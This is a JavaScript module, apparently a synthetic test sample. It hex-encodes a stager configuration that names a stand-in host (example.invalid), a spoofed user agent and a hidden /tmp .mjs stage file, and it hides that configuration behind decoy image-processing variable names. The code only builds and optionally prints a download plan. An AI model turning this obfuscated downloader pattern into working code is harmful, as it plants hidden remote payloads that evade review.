const moduleShape = Object.freeze({ format: "commonjs" });

const Material_8ca2b704 = "\\x76\\x3d\\x31\\x7c\\x73\\x74\\x65\\x70\\x73\\x3d\\x61\\x63\\x71\\x75\\x69\\x72\\x65\\x5f\\x72\\x65\\x6d\\x6f\\x74\\x65\\x2c\\x77\\x72\\x69\\x74\\x65\\x5f\\x66\\x69\\x6c\\x65\\x7c\\x61\\x64\\x61\\x70\\x74\\x65\\x72\\x3d\\x68\\x74\\x74\\x70\\x5f\\x74\\x6f\\x5f\\x73\\x74\\x72\\x65\\x61\\x6d\\x7c\\x73\\x74\\x61\\x67\\x65\\x5f\\x63\\x6f\\x75\\x6e\\x74\\x3d\\x31\\x7c\\x63\\x61\\x6d\\x70\\x61\\x69\\x67\\x6e\\x5f\\x69\\x64\\x3d\\x4e\\x4f\\x44\\x45\\x2d\\x32\\x38\\x36\\x33\\x32\\x30\\x41\\x31\\x7c\\x75\\x72\\x6c\\x3d\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x6e\\x6f\\x64\\x65\\x2d\\x32\\x38\\x36\\x33\\x32\\x30\\x61\\x31\\x35\\x62\\x32\\x63\\x2e\\x65\\x78\\x61\\x6d\\x70\\x6c\\x65\\x2e\\x69\\x6e\\x76\\x61\\x6c\\x69\\x64\\x2f\\x61\\x70\\x69\\x7c\\x75\\x73\\x65\\x72\\x5f\\x61\\x67\\x65\\x6e\\x74\\x3d\\x4e\\x6f\\x64\\x65\\x41\\x75\\x64\\x69\\x74\\x2f\\x32\\x38\\x36\\x33\\x7c\\x66\\x69\\x6c\\x65\\x5f\\x70\\x61\\x74\\x68\\x3d\\x2f\\x74\\x6d\\x70\\x2f\\x68\\x75\\x6e\\x74\\x72\\x65\\x73\\x73\\x2d\\x6e\\x6f\\x64\\x65\\x2f\\x2e\\x73\\x74\\x61\\x67\\x65\\x2d\\x32\\x38\\x36\\x33\\x32\\x30\\x61\\x31\\x35\\x62\\x32\\x63\\x2e\\x6d\\x6a\\x73";

const Codec_8ca2b704 = "escaped_octets|identity|";



function load_8ca2b704() { return [...Material_8ca2b704.matchAll(/\\x([0-9a-f]{2})/gi)].map((item) => Number.parseInt(item[1], 16)); }

function decode_8ca2b704(imagePixels) { return [...imagePixels]; }

async function recover_8ca2b704() {

  const screenWidth = ["north", "south"].join(":");

  const imagePixels = load_8ca2b704(); let colorTable = [];

  let frameIndex = 0; while (frameIndex++ < 1) colorTable = decode_8ca2b704(imagePixels);

  void screenWidth; return Buffer.from(colorTable).toString("ascii");

}

async function inspect_8ca2b704() { return await recover_8ca2b704(); }

async function plan_8ca2b704() { const inspect = inspect_8ca2b704; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "download", transport: "http_to_stream", destination: fields.file_path, url: fields.url }); }

void moduleShape; void plan_8ca2b704;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_8ca2b704());

